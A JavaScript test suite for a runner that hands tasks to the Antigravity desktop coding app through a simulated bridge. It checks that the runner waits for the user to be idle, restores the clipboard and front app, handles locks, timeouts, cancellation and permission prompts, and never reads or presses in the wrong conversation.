import assert from 'node:assert/strict';
import { spawn, spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { basename, dirname, join } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import test from 'node:test';

import { acquireLock } from '../../scripts/desktop.mjs';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const RUNNER = join(ROOT, 'scripts', 'desktop.mjs');
const FAKE = join(ROOT, 'tests', 'fixtures', 'fake-desktop-bridge.mjs');

function git(cwd, ...args) {
  const result = spawnSync('git', ['-c', 'user.email=t@example.com', '-c', 'user.name=t', ...args], { cwd, encoding: 'utf8' });
  assert.equal(result.status, 0, result.stderr);
}

function setup(state = {}, { project = 'ws', projects = [project] } = {}) {
  const cwd = mkdtempSync(join(tmpdir(), 'agybird-dr-ws-'));
  git(cwd, 'init', '-q');
  writeFileSync(join(cwd, 'README.md'), 'hello\n');
  git(cwd, 'add', '.');
  git(cwd, 'commit', '-q', '-m', 'init');
  const projectsDir = mkdtempSync(join(tmpdir(), 'agybird-dr-projects-'));
  projects.forEach((name, index) => {
    writeFileSync(join(projectsDir, `p${index}.json`), JSON.stringify({ id: `p${index}`, name, projectResources: { resources: [{ gitFolder: { folderUri: pathToFileURL(cwd).href } }] } }));
  });
  const stateFile = join(mkdtempSync(join(tmpdir(), 'agybird-dr-fake-')), 'state.json');
  writeFileSync(stateFile, JSON.stringify(state));
  const stateDir = mkdtempSync(join(tmpdir(), 'agybird-dr-state-'));
  const env = {
    ...process.env,
    AGYBIRD_DESKTOP_BRIDGE: FAKE,
    AGYBIRD_FAKE_DESKTOP_STATE: stateFile,
    AGYBIRD_PROJECTS_DIR: projectsDir,
    AGYBIRD_STATE_DIR: stateDir,
    AGYBIRD_DESKTOP_POLL_MS: '10',
  };
  return { cwd, env, stateDir, fake: () => JSON.parse(readFileSync(stateFile, 'utf8')) };
}

function start(context, args = [], prompt = 'Say READY.') {
  const child = spawn(process.execPath, [RUNNER, '--category', 'code', '--cwd', context.cwd, ...args], { env: context.env, stdio: ['pipe', 'pipe', 'pipe'] });
  child.stdin.end(prompt);
  const done = new Promise((resolve) => {
    let stdout = '';
    let stderr = '';
    child.stdout.setEncoding('utf8').on('data', (chunk) => { stdout += chunk; });
    child.stderr.setEncoding('utf8').on('data', (chunk) => { stderr += chunk; });
    child.on('close', (code) => resolve({ code, stderr, envelope: JSON.parse(stdout.trim().split('\n').pop()) }));
  });
  return { child, done };
}

const run = (context, args, prompt) => start(context, args, prompt).done;
const names = (context) => (context.fake().calls ?? []).map((call) => call[0]);

function assertCleanedUp(context) {
  const fake = context.fake();
  assert.equal(fake.clipboard, 'user clipboard', 'clipboard restored');
  assert.equal(fake.frontmost, 'com.example.host', 'frontmost app restored');
  assert.equal(existsSync(join(context.stateDir, 'desktop.lock')), false, 'lock released');
}

test('a read task runs in a new conversation of the workspace project and returns the reply', async () => {
  const context = setup({ runningPolls: 2, reply: 'READY' });
  const { code, envelope } = await run(context);
  assert.equal(code, 0);
  assert.equal(envelope.status, 'success');
  assert.equal(envelope.response, 'READY');
  const { conversation_marker: marker, ...evidence } = envelope.evidence;
  assert.deepEqual(evidence, { transport: 'desktop', app_version: '2.35.2', preset: 'Request Review', session_resumed: false, changed_files: [], project: 'ws', conversation_title: 'Fake Task - ws - Antigravity' });
  assert.match(marker, /^[0-9a-f]{16}$/);
  const calls = context.fake().calls;
  assert.deepEqual(calls.find((call) => call[0] === 'new-conversation'), ['new-conversation', 'ws']);
  const order = names(context);
  for (const [before, after] of [['front', 'new-conversation'], ['new-conversation', 'paste-input'], ['paste-input', 'restore'], ['restore', 'read-input'], ['read-input', 'send']]) {
    assert.ok(order.indexOf(before) < order.indexOf(after), `${before} before ${after}`);
  }
  assert.ok(!order.includes('answer') && !order.includes('stop'));
  assertCleanedUp(context);
});

test('the app is in front only from the switch to the paste: the read back and Send run behind the user\'s app', async () => {
  const context = setup({ runningPolls: 1 });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'success');
  const { calls, frontmostAtCalls } = context.fake();
  const frontAt = (name) => frontmostAtCalls[calls.findIndex((call) => call[0] === name)];
  assert.equal(frontAt('paste-input'), 'com.google.antigravity');
  assert.equal(frontAt('read-input'), 'com.example.host');
  assert.equal(frontAt('send'), 'com.example.host');
  assertCleanedUp(context);
});

test('the switch to the app waits until the keyboard and mouse have been idle for 3 s', async () => {
  const context = setup({ runningPolls: 1, idleSeq: [0.2, 1.5, 2.9, 3.1] });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'success');
  const order = names(context);
  // The preflight probe reads 0.2 s; the wait reads 1.5, 2.9, then 3.1 s, saves
  // the clipboard and reads 3.1 s once more before the switch.
  assert.equal(order.slice(0, order.indexOf('front')).filter((name) => name === 'probe').length, 5);
  assertCleanedUp(context);
});

test('a user back at the keyboard while the clipboard is saved is waited for again before the switch', async () => {
  // Preflight, then idle, the clipboard saved, busy again at the check before the switch, then idle twice.
  const context = setup({ runningPolls: 1, idleSeq: [60, 60, 0.1, 60, 60] });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'success');
  const order = names(context);
  const beforeFront = order.slice(0, order.indexOf('front'));
  assert.equal(beforeFront.filter((name) => name === 'clipboard-get').length, 2, 'the clipboard saved again after the wait');
  assert.equal(beforeFront.at(-1), 'probe', 'the last call before the switch checks the user');
  assertCleanedUp(context);
});

test('a mismatched paste is left unsent, not cleared, when the user is back at the Mac', async () => {
  // Preflight, wait and check before the switch idle; busy from the probe before clearing on.
  const context = setup({ paste: 'something else', idleSeq: [60, 60, 60, 0.1] });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  const order = names(context);
  assert.ok(!order.includes('clear-input') && !order.includes('send'));
  assert.equal(order.filter((name) => name === 'front').length, 1, 'the app was not brought forward again');
  assert.ok(envelope.warnings.some((warning) => /left unsent/.test(warning)), envelope.warnings.join(' | '));
  assertCleanedUp(context);
});

test('a clipboard restore whose write fails is reported, never taken as restored', async () => {
  const context = setup({ runningPolls: 1, clipboardItems: [{ 'public.utf8-plain-text': 'aGk=' }], restoreFails: true });
  const { envelope } = await run(context);
  assert.ok(envelope.warnings.some((warning) => /clipboard could not be restored/.test(warning)), envelope.warnings.join(' | '));
});

test('an agent question is reported for the user to answer in the app, never as a permission prompt', async () => {
  const context = setup({ dialog: { question: 'Which color do you prefer?', options: ['1 Red', '2 Blue', '3 Other (write your answer)'] } });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'blocked');
  assert.equal(envelope.evidence.blocked_reason, 'agent_question');
  assert.deepEqual(envelope.permission_requests, []);
  assert.deepEqual(envelope.evidence.agent_question.options, ['1 Red', '2 Blue', '3 Other (write your answer)']);
  assert.ok(!names(context).includes('answer') && !names(context).includes('stop'));
  assertCleanedUp(context);
});

test('a switch to the app that leaves it behind ends the run before a conversation opens', async () => {
  const context = setup({ frontFails: true });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.ok(envelope.warnings.some((warning) => /did not come to the front/.test(warning)), envelope.warnings.join(' | '));
  for (const name of ['new-conversation', 'clipboard-set', 'paste-input', 'send']) assert.ok(!names(context).includes(name), `no ${name}`);
  assertCleanedUp(context);
});

test('a paste refused before it pastes leaves no prompt behind and warns of none', async () => {
  const context = setup({ frontLostBeforePaste: true });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  const order = names(context);
  assert.ok(!order.includes('clear-input') && !order.includes('send'));
  assert.ok(!envelope.warnings.some((warning) => /left unsent|may still be in the Antigravity app input/.test(warning)), envelope.warnings.join(' | '));
  assert.equal(context.fake().clipboard, 'user clipboard');
});

test('a user who keeps typing past the wait is never interrupted: blocked, nothing touched', async () => {
  const context = setup({ idleSeq: [0.1] });
  context.env.AGYBIRD_DESKTOP_IDLE_WAIT_MS = '50';
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'blocked');
  assert.equal(envelope.evidence.blocked_reason, 'user_active');
  for (const name of ['front', 'clipboard-get', 'clipboard-set', 'new-conversation']) assert.ok(!names(context).includes(name), `no ${name}`);
  assertCleanedUp(context);
});

test('a locked screen or an app window off the Space shown blocks before the app is switched to', async () => {
  for (const [state, reason] of [[{ locked: true }, 'screen_locked'], [{ onScreen: false }, 'not_on_screen']]) {
    const context = setup(state);
    const { envelope } = await run(context);
    assert.equal(envelope.status, 'blocked');
    assert.equal(envelope.evidence.blocked_reason, reason);
    assert.ok(!names(context).includes('front'), `${reason}: no switch to the app`);
    assertCleanedUp(context);
  }
});

test('a clipboard saved whole is put back whole, with no loss reported', async () => {
  const items = [{ 'public.html': 'PGI+aGk8L2I+', 'public.utf8-plain-text': 'aGk=' }];
  const context = setup({ runningPolls: 1, clipboardOther: true, clipboardItems: items });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'success');
  assert.deepEqual(context.fake().restoredItems, items);
  assert.ok(!envelope.warnings.some((warning) => /only its text/.test(warning)), envelope.warnings.join(' | '));
});

test('the prompt pasted is the delegated task, wrapped like the CLI runner\'s', async () => {
  const context = setup();
  assert.equal((await run(context, [], 'Explain README.md.')).envelope.status, 'success');
  const [pasted] = context.fake().clipboardWrites;
  assert.match(pasted, /<agybird_user_task>\nExplain README\.md\.\n<\/agybird_user_task>/);
  assert.match(pasted, /Do not create, edit, move, or delete files/);
});

test('the prompt ends with the run\'s own marker, after any reply instructions, and each run draws a new one', async () => {
  const schema = join(mkdtempSync(join(tmpdir(), 'agybird-dr-schema-')), 'schema.json');
  writeFileSync(schema, JSON.stringify({ type: 'object', required: ['verdict'] }));
  const context = setup({ reply: '```json\n{"verdict": "approve"}\n```' });
  const { envelope } = await run(context, ['--json-schema', schema]);
  assert.equal(envelope.status, 'success', JSON.stringify(envelope.warnings));
  const [pasted] = context.fake().clipboardWrites;
  const lines = pasted.split('\n');
  assert.equal(lines.at(-1), `[agybird-run ${envelope.evidence.conversation_marker}]`);
  assert.match(lines.at(-2), /Ignore it/);
  assert.ok(pasted.indexOf('JSON schema') < pasted.indexOf('[agybird-run '), 'the reply contract comes before the marker');
  const again = setup();
  assert.notEqual((await run(again)).envelope.evidence.conversation_marker, envelope.evidence.conversation_marker);
});

test('preflight blocks with a specific reason and leaves no lock', async () => {
  const cases = [
    [{ trusted: false }, {}, 'not_trusted'],
    [{ version: '2.40.0' }, {}, 'unsupported_version'],
    [{ missingLabel: 'Select model' }, {}, 'labels_missing'],
    [{}, { projects: ['ws', 'ws'] }, 'ambiguous_project'],
  ];
  for (const [state, projectOptions, reason] of cases) {
    const context = setup(state, projectOptions);
    const { code, envelope } = await run(context);
    assert.equal(envelope.status, 'blocked', reason);
    assert.equal(envelope.evidence.blocked_reason, reason);
    assert.equal(code, 0, `${reason}: blocked exits 0, as the CLI runner does`);
    assert.ok(!names(context).includes('send'), reason);
    assert.equal(existsSync(join(context.stateDir, 'desktop.lock')), false, reason);
  }
});

const projectFiles = (context) => readdirSync(context.env.AGYBIRD_PROJECTS_DIR).map((entry) => JSON.parse(readFileSync(join(context.env.AGYBIRD_PROJECTS_DIR, entry), 'utf8')));

test('a folder no project points at gets one, named after it, and the next run reuses it', async () => {
  const context = setup({ runningPolls: 1 }, { projects: [] });
  const first = await run(context);
  assert.equal(first.envelope.status, 'success', first.envelope.warnings.join(' | '));
  const name = basename(context.cwd);
  assert.equal(first.envelope.evidence.project_created, true);
  assert.equal(first.envelope.evidence.project, name);
  assert.deepEqual(context.fake().calls.find((call) => call[0] === 'new-conversation'), ['new-conversation', name]);
  const [created] = projectFiles(context);
  assert.equal(created.projectResources.resources[0].gitFolder.folderUri, pathToFileURL(context.cwd).href);
  const second = await run(context);
  assert.equal(second.envelope.evidence.project_created, undefined);
  assert.equal(projectFiles(context).length, 1, 'no second project');
});

test('a new project never takes a name another project has', async () => {
  const context = setup({ runningPolls: 1 }, { projects: [] });
  const name = basename(context.cwd);
  writeFileSync(join(context.env.AGYBIRD_PROJECTS_DIR, 'other.json'), JSON.stringify({ id: 'other', name, projectResources: { resources: [{ gitFolder: { folderUri: 'file:///elsewhere' } }] } }));
  const { envelope } = await run(context);
  assert.equal(envelope.evidence.project, `${name}-2`);
});

test('a linked worktree gets its own project named <repo>-<worktree>', async () => {
  const context = setup({ runningPolls: 1 }, { projects: [] });
  const worktree = join(mkdtempSync(join(tmpdir(), 'agybird-dr-wt-')), 'feature-x');
  git(context.cwd, 'worktree', 'add', '-q', '-b', 'feature-x', worktree);
  const { envelope } = await start({ ...context, cwd: worktree }).done;
  assert.equal(envelope.status, 'success', envelope.warnings.join(' | '));
  assert.equal(envelope.evidence.project, `${basename(context.cwd)}-feature-x`);
  assert.ok(projectFiles(context).some((project) => project.projectResources.resources[0].gitFolder.folderUri === pathToFileURL(realpathSync(worktree)).href || project.projectResources.resources[0].gitFolder.folderUri === pathToFileURL(worktree).href));
});

test('a created project the app does not list blocks with nothing pasted', async () => {
  const context = setup({ notListed: true }, { projects: [] });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'blocked');
  assert.equal(envelope.evidence.blocked_reason, 'project_not_listed');
  assert.ok(!names(context).includes('clipboard-set'));
  assertCleanedUp(context);
});

test('an app version outside the tested range runs when the user confirmed it', async () => {
  const context = setup({ version: '2.40.0' });
  context.env.AGYBIRD_DESKTOP_ALLOW_VERSION = '1';
  assert.equal((await run(context)).envelope.status, 'success');
});

test('another desktop run holding the lock blocks the run', async () => {
  const context = setup();
  writeFileSync(join(context.stateDir, 'desktop.lock'), String(process.pid));
  const { envelope } = await run(context);
  assert.equal(envelope.evidence.blocked_reason, 'locked');
  assert.equal(readFileSync(join(context.stateDir, 'desktop.lock'), 'utf8'), String(process.pid));
});

test('a lock left by a process that is gone is taken over', async () => {
  const context = setup();
  writeFileSync(join(context.stateDir, 'desktop.lock'), '999999999');
  assert.equal((await run(context)).envelope.status, 'success');
});

test('every preset is accepted as it is; Auto and Turbo add a warning', async () => {
  for (const preset of ['Request Review', 'Default', 'Auto', 'Turbo']) {
    const context = setup({ preset });
    const { envelope } = await run(context);
    assert.equal(envelope.status, 'success', preset);
    assert.equal(envelope.evidence.preset, preset);
    const warned = envelope.warnings.some((warning) => /without asking/.test(warning));
    assert.equal(warned, preset === 'Auto' || preset === 'Turbo', preset);
  }
});

test('read mode turns a working-tree change into an error', async () => {
  const context = setup();
  writeFileSync(context.env.AGYBIRD_FAKE_DESKTOP_STATE, JSON.stringify({ onSend: { path: join(context.cwd, 'new.txt'), content: 'x' } }));
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.deepEqual(envelope.evidence.changed_files, ['new.txt']);
  assert.ok(envelope.warnings.some((warning) => /read mode/.test(warning)));
});

test('read mode sees a change to a dirty file past the first 500', async () => {
  const context = setup();
  for (let index = 0; index < 600; index += 1) writeFileSync(join(context.cwd, `f${String(index).padStart(3, '0')}.txt`), 'before\n');
  writeFileSync(context.env.AGYBIRD_FAKE_DESKTOP_STATE, JSON.stringify({ onSend: { path: join(context.cwd, 'f599.txt'), content: 'after\n' } }));
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.deepEqual(envelope.evidence.changed_files, ['f599.txt']);
});

test('write mode reports the files the run changed', async () => {
  const context = setup();
  writeFileSync(context.env.AGYBIRD_FAKE_DESKTOP_STATE, JSON.stringify({ onSend: { path: join(context.cwd, 'README.md'), content: 'changed\n' } }));
  const { envelope } = await run(context, ['--mode', 'write']);
  assert.equal(envelope.status, 'success');
  assert.deepEqual(envelope.evidence.changed_files, ['README.md']);
});

test('a permission dialog yields needs_permission and the run cleans up', async () => {
  const context = setup({ runningPolls: 1, dialog: { question: 'Allow list directory contents?', options: ['1 Yes, allow this time', "2 Yes, and always allow 'ls' in this conversation", "3 Yes, and always allow 'ls'", '4 No (tell the agent what to do instead)'] } });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'needs_permission');
  assert.equal(envelope.permission_requests.length, 1);
  const [request] = envelope.permission_requests;
  assert.equal(request.question, 'Allow list directory contents?');
  assert.equal(request.scope, 'ls');
  assert.equal(request.options.length, 4);
  assert.equal(request.grantable, false);
  assert.ok(!names(context).includes('answer'));
  assertCleanedUp(context);
});

test('a run past its deadline is stopped and reported as an error', async () => {
  const context = setup({ stuck: true });
  const { envelope } = await run(context, ['--timeout', '300ms']);
  assert.equal(envelope.status, 'error');
  assert.ok(envelope.warnings.some((warning) => /timed out/.test(warning)));
  assert.ok(names(context).includes('stop'));
  assert.ok(!names(context).includes('answer'));
  assertCleanedUp(context);
});

test('a paste that reads back differently is cleared and never sent', async () => {
  const context = setup({ paste: 'something else' });
  const { code, envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.equal(code, 1, 'only error exits 1');
  assert.ok(names(context).includes('clear-input'));
  assert.ok(!names(context).includes('send'));
  assertCleanedUp(context);
});

test('SIGTERM stops the run in the app and cleans up', { skip: process.platform === 'win32' }, async () => {
  const context = setup({ stuck: true });
  const { child, done } = start(context);
  // Once the run polls, Send has returned and bound the conversation.
  while (!names(context).slice(names(context).indexOf('send') + 1).includes('snapshot') || !names(context).includes('send')) await new Promise((resolve) => setTimeout(resolve, 20));
  child.kill('SIGTERM');
  const { envelope } = await done;
  assert.equal(envelope.status, 'error');
  assert.equal(context.fake().stopped, true);
  assert.ok(envelope.warnings.some((warning) => /cancelled and stopped/.test(warning)));
  assertCleanedUp(context);
});

const waitFor = async (context, command) => {
  while (!names(context).includes(command)) await new Promise((resolve) => setTimeout(resolve, 20));
};
const lockFile = (context) => join(context.stateDir, 'desktop.lock');

test('a SIGTERM before the conversation title is known says stopped only when Stop was pressed', { skip: process.platform === 'win32' }, async () => {
  const context = setup({ stuck: true, sendReturnsNoTitle: true });
  context.env.AGYBIRD_DESKTOP_POLL_MS = '5000';
  const { child, done } = start(context);
  await waitFor(context, 'send');
  await new Promise((resolve) => setTimeout(resolve, 200));
  child.kill('SIGTERM');
  const { envelope } = await done;
  assert.equal(envelope.status, 'error');
  assert.notEqual(context.fake().stopped, true, 'Stop was refused in the titled conversation');
  assert.ok(!envelope.warnings.some((warning) => /stopped in the app/.test(warning)), envelope.warnings.join(' | '));
  assert.ok(envelope.warnings.some((warning) => /may still be going/.test(warning)));
  // The app may still run, so the lock stays until the run's deadline.
  assert.equal(JSON.parse(readFileSync(lockFile(context), 'utf8')).app, true);
  assert.equal(context.fake().clipboard, 'user clipboard');
});

test('a bridge failure after Send presses Stop in the run\'s conversation before the lock is released', async () => {
  const context = setup({ stuck: true, failSnapshotAfterSend: true });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.equal(context.fake().stopped, true);
  assert.deepEqual(context.fake().calls.find((call) => call[0] === 'stop'), ['stop', TITLE, envelope.evidence.conversation_marker]);
  assertCleanedUp(context);
});

test('when Stop cannot be pressed after a failure, the run says the app may still run and keeps the lock', async () => {
  const context = setup({ stuck: true, failSnapshotAfterSend: true, stopFails: true });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.ok(envelope.warnings.some((warning) => /may still be going/.test(warning)));
  assert.equal(existsSync(lockFile(context)), true);
  const next = setup();
  next.env.AGYBIRD_STATE_DIR = context.stateDir;
  assert.equal((await run(next)).envelope.evidence.blocked_reason, 'locked');
});

test('a cancel during the paste clears the composer and restores everything without waiting for the paste', { skip: process.platform === 'win32' }, async () => {
  const context = setup({ delays: { 'paste-input': 20_000 } });
  const { child, done } = start(context);
  await waitFor(context, 'paste-input');
  const started = Date.now();
  child.kill('SIGTERM');
  const { envelope } = await done;
  assert.ok(Date.now() - started < 10_000, 'the paste was interrupted');
  assert.equal(envelope.status, 'error');
  assert.equal(context.fake().cleared, true);
  assert.ok(!names(context).includes('send'));
  assertCleanedUp(context);
});

test('a cancel during the clipboard restore before Send clears the composer, presses no Stop and frees the lock', { skip: process.platform === 'win32' }, async () => {
  const context = setup({ delays: { 'clipboard-restore': 1_500 } });
  const { child, done } = start(context);
  await waitFor(context, 'clipboard-restore');
  child.kill('SIGTERM');
  const { envelope } = await done;
  assert.equal(envelope.status, 'error');
  assert.ok(envelope.warnings.some((warning) => /cancelled before the prompt was sent/.test(warning)), envelope.warnings.join(' | '));
  assert.equal(context.fake().cleared, true, 'the composer was cleared');
  assert.ok(!names(context).includes('send'), 'Send was not pressed');
  assert.ok(!names(context).includes('stop'), 'Stop was not pressed against an unsent conversation');
  assertCleanedUp(context);
});

test('a cancel during a slow restore after the paste leaves the prompt unsent instead of overrunning the grace', { skip: process.platform === 'win32' }, async () => {
  // The restore under way when the signal comes takes about 5 s (each step well
  // inside its 3 s timeout, even on a slow runner); clearing could take 14 s
  // more, past the 18 s budget.
  const context = setup({ delays: { 'clipboard-restore': 2_400, restore: 2_400 } });
  const { child, done } = start(context);
  await waitFor(context, 'clipboard-restore');
  const started = Date.now();
  child.kill('SIGTERM');
  const { envelope } = await done;
  assert.ok(Date.now() - started < 18_000, 'cleanup stayed inside the budget');
  assert.equal(envelope.status, 'error');
  const order = names(context);
  assert.ok(!order.includes('clear-input') && !order.includes('send'));
  assert.ok(envelope.warnings.some((warning) => /too little time left/.test(warning)), envelope.warnings.join(' | '));
  assertCleanedUp(context);
});

test('options the desktop transport cannot honour are refused before the app is touched', async () => {
  for (const args of [['--model', 'x'], ['--swarm', '--new-session'], ['--conversation', 'c1'], ['--effort', 'high']]) {
    const context = setup();
    const { envelope } = await run(context, args);
    assert.equal(envelope.status, 'error', args[0]);
    assert.match(envelope.warnings[0], new RegExp(args[0]));
    assert.equal(context.fake().calls, undefined, args[0]);
  }
});

test('with --json-schema the last fenced JSON block of the reply is the structured output', async () => {
  const context = setup({ reply: 'Findings below.\n```json\n{"verdict": "approve", "findings": []}\n```' });
  const schema = join(mkdtempSync(join(tmpdir(), 'agybird-dr-schema-')), 'schema.json');
  mkdirSync(dirname(schema), { recursive: true });
  writeFileSync(schema, JSON.stringify({ type: 'object', required: ['verdict', 'findings'] }));
  const { envelope } = await run(context, ['--json-schema', schema]);
  assert.equal(envelope.status, 'success');
  assert.deepEqual(envelope.structured_output, { verdict: 'approve', findings: [] });

  const missing = setup({ reply: 'No block here.' });
  assert.equal((await run(missing, ['--json-schema', schema])).envelope.status, 'error');
});

const DIALOG = { question: 'Allow list directory contents?', options: ['1 Yes, allow this time', "2 Yes, and always allow 'ls' in this conversation", "3 Yes, and always allow 'ls'", '4 No (tell the agent what to do instead)'] };
const TITLE = 'Fake Task - ws - Antigravity';
// The marker of the run that asked, and its message as the app shows it.
const NONCE = '0123456789abcdef';
const OWN = `Go on.\n[agybird-run ${NONCE}]`;

test('read mode declines a permission prompt when the run already changed the working tree', async () => {
  const context = setup();
  writeFileSync(context.env.AGYBIRD_FAKE_DESKTOP_STATE, JSON.stringify({ dialog: DIALOG, onSend: { path: join(context.cwd, 'new.txt'), content: 'x' } }));
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.deepEqual(envelope.evidence.changed_files, ['new.txt']);
  assert.deepEqual(envelope.permission_requests, []);
  const answers = context.fake().calls.filter((call) => call[0] === 'answer');
  assert.deepEqual(answers.map((call) => call[1]), ['Skip']);
  assertCleanedUp(context);
});

test('write mode reports what changed before a permission prompt', async () => {
  const context = setup();
  writeFileSync(context.env.AGYBIRD_FAKE_DESKTOP_STATE, JSON.stringify({ dialog: DIALOG, onSend: { path: join(context.cwd, 'README.md'), content: 'edited\n' } }));
  const { envelope } = await run(context, ['--mode', 'write']);
  assert.equal(envelope.status, 'needs_permission');
  assert.deepEqual(envelope.evidence.changed_files, ['README.md']);
  assert.equal(envelope.evidence.conversation_title, TITLE);
});

test('the clipboard is put back before Send, with its own markers, and lost non-text content is reported', async () => {
  const context = setup({ runningPolls: 1, clipboardMarkers: ['org.nspasteboard.ConcealedType'], clipboardOther: true });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'success');
  const order = names(context);
  assert.ok(order.indexOf('clipboard-restore') > order.indexOf('paste-input'), 'restored after the paste');
  assert.ok(order.indexOf('clipboard-restore') < order.indexOf('send'), 'restored before Send');
  assert.deepEqual(context.fake().restoredMarkers, ['org.nspasteboard.ConcealedType']);
  assert.ok(envelope.warnings.some((warning) => /only its text/.test(warning)));
  assertCleanedUp(context);
});

test('a Copy that leaves the clipboard unchanged falls back to the on-screen reply, never the user clipboard', async () => {
  const context = setup({ copyNoop: true, reply: 'on screen' });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'success');
  assert.equal(envelope.response, 'on screen');
  assert.ok(envelope.warnings.some((warning) => /could not be copied/.test(warning)));
  assertCleanedUp(context);
});

test('the run stops reading, and presses nothing, once the app shows another conversation', async () => {
  const context = setup({ runningPolls: 5, switchAfter: 1 });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.ok(envelope.warnings.some((warning) => /another conversation/.test(warning)));
  assert.ok(!names(context).includes('stop'));
  assert.ok(!names(context).includes('copy-reply'));
  // The run's own conversation may still be going, so the lock stays and says so.
  assert.ok(envelope.warnings.some((warning) => /may still be going/.test(warning)));
  assert.equal(JSON.parse(readFileSync(join(context.stateDir, 'desktop.lock'), 'utf8')).app, true);
  assert.equal(context.fake().clipboard, 'user clipboard');
  assert.equal(context.fake().frontmost, 'com.example.host');
});

test('a switch to another conversation while the run\'s is still untitled ends as error, with nothing pressed', async () => {
  const context = setup({ untitledPolls: 2, switchWhileUntitled: true, runningPolls: 3 });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.equal(envelope.response, null);
  assert.equal(envelope.evidence.conversation_title, undefined);
  for (const command of ['copy-reply', 'answer', 'stop']) assert.ok(!names(context).includes(command), command);
  assert.equal(context.fake().stopped, undefined);
});

test('a conversation the user opens while the app names the run\'s is never adopted', async () => {
  const context = setup({ switchDuringNaming: 'Other Chat', runningPolls: 3, reply: 'the other conversation\'s reply' });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.equal(envelope.response, null);
  assert.equal(envelope.evidence.conversation_title, undefined);
  assert.ok(envelope.warnings.some((warning) => /could not tie/.test(warning)), envelope.warnings.join(' | '));
  for (const command of ['copy-reply', 'answer', 'stop']) assert.ok(!names(context).includes(command), command);
  assert.equal(context.fake().stopped, undefined);
});

test('a new conversation the user creates and the app titles during the naming wait is never adopted', async () => {
  // Rival Chat is not listed before Send, is listed after it and is what the app shows.
  const context = setup({ rivalDuringNaming: 'Rival Chat', runningPolls: 3, reply: 'the rival conversation\'s reply' });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.equal(envelope.response, null);
  assert.equal(envelope.evidence.conversation_title, undefined);
  for (const command of ['copy-reply', 'answer', 'stop']) assert.ok(!names(context).includes(command), command);
  assert.equal(context.fake().stopped, undefined);
});

test('a conversation shown under the run\'s title without the run\'s own message is never read or pressed', async () => {
  // After the second poll the app shows a namesake conversation: same title, another message.
  const context = setup({ namesakeAfter: 2, runningPolls: 6, reply: 'the namesake\'s reply' });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.equal(envelope.response, null);
  for (const command of ['copy-reply', 'answer', 'stop']) assert.ok(!names(context).includes(command), command);
  assert.equal(context.fake().stopped, undefined);
});

test('the conversation title is taken from the Send call, so a late title is never adopted', async () => {
  const late = setup({ untitledPolls: 2, runningPolls: 3 });
  const { envelope } = await run(late);
  assert.equal(envelope.status, 'error');
  assert.ok(!names(late).includes('copy-reply'));
  const send = late.fake().calls.find((call) => call[0] === 'send');
  assert.deepEqual(send.slice(0, 3), ['send', 'Antigravity', 'ws']);
  assert.match(send[3], /^[0-9a-f]{16}$/);
});

test('paste and send are refused once the app no longer shows the new conversation', async () => {
  const context = setup({ titleBeforeSend: 'Other Chat - ws - Antigravity' });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.ok(!names(context).includes('send'));
  assert.equal(context.fake().sent, undefined);
});

test('a successful run names the conversation it read', async () => {
  const context = setup({ runningPolls: 1 });
  assert.equal((await run(context)).envelope.evidence.conversation_title, TITLE);
});

test('a resumed run waits for the new turn instead of returning the reply already on screen', async () => {
  const context = setup({ sent: true, project: 'ws', message: OWN, dialog: DIALOG, replyBeforeDialog: 'checking the folder', lag: 1, runningPolls: 2, reply: 'final answer' });
  const { envelope } = await run(context, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-marker', NONCE]);
  assert.equal(envelope.status, 'success', JSON.stringify(envelope.warnings));
  assert.equal(envelope.response, 'final answer');
});

test('a resumed run answers nothing when the app shows another conversation or another option 1', async () => {
  const other = setup({ sent: true, project: 'ws', message: OWN, dialog: DIALOG, title: 'Other Chat - ws - Antigravity' });
  assert.equal((await run(other, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-marker', NONCE])).envelope.status, 'error');
  assert.ok(!names(other).includes('answer'));
  const reordered = setup({ sent: true, project: 'ws', message: OWN, dialog: { ...DIALOG, options: ["1 Yes, and always allow 'ls'", ...DIALOG.options.slice(1)] } });
  const { envelope } = await run(reordered, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-marker', NONCE]);
  assert.equal(envelope.status, 'error');
  assert.equal(reordered.fake().answered, undefined);
});

test('a lock being written, or still within its time, is held; one past its time is taken over', async () => {
  const fresh = setup();
  writeFileSync(join(fresh.stateDir, 'desktop.lock'), '');
  assert.equal((await run(fresh)).envelope.evidence.blocked_reason, 'locked');
  const expired = setup();
  writeFileSync(join(expired.stateDir, 'desktop.lock'), JSON.stringify({ pid: process.pid, expiresAt: Date.now() - 1 }));
  assert.equal((await run(expired)).envelope.status, 'success');
  assert.equal(existsSync(join(expired.stateDir, 'desktop.lock')), false);
});

